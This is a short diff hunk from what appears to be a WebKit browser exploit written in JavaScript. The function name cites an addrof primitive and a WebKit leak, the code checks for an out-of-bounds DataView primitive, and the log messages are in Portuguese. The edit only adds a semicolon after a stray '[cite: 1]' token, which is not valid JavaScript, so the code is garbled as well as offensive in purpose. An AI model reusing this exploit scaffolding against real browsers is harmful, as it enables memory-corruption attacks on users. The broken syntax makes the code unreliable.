@@ -65,7 +65,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         if (!getOOBDataView()) {
             throw new Error("Falha ao obter primitiva OOB.");
         }
-        logS3("OOB DataView obtido com sucesso.", "info"); [cite: 1]
+        logS3("OOB DataView obtido com sucesso.", "info"); [cite: 1];
 
         // --- VERIFICAÇÃO: OOB DataView m_length ---
         const oob_dv = getOOBDataView();
